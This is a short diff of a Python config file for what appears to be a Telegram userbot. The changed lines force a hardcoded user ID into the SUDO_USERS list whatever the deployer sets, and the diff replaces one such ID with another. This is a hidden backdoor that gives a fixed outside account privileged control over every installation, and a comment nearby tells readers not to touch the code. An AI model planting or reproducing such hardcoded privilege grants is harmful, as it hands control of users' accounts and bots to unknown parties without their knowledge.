@@ -73,8 +73,8 @@ STRING38 = config("STRING38", default=None)
 STRING39 = config("STRING39", default=None)
 STRING40 = config("STRING40", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5269906172 not in SUDO_USERS:
+    SUDO_USERS.append(5269906172)
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
